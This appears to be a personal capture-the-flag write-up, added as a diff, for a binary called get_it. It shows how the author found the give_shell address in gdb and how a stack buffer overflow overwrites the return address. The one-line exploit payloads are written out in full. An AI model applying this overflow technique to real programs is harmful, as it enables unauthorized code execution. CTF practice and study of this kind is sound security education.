@@ -1,0 +1,18 @@
+=== Personal solution description ===
+
+Similar to csaw16_warmup, but you have to find the function address with gdb. First open in Ghidra. There's a function we need to jump to, called give_shell:
+
+$ gdb -q
+(gdb) > file get_it
+(gdb) > p &give_shell
+$1 = (<text variable, no debug info> *) 0x4005b6 <give_shell>
+
+We need 32 padding bytes and 8 RBP bytes (according to the stack arrangement in Ghidra).
+So, here we go:
+
+$ (echo -ne 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x05@\x00\x00\x00\x00\x00';cat;) | ./get_it
+
+But this fails again. Just like in warmup, for some reason, 0xb6 ruins the exploit. I still can't find the source of this. Changing 0xb6 to 0xb7 continues to work. Maybe skipping RBP pushing (somehow) prevents the program from crashing on system() call? That's so weird...
+
+So the solution:
+$ (echo -ne 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb7\x05@\x00\x00\x00\x00\x00';cat;) | ./get_it
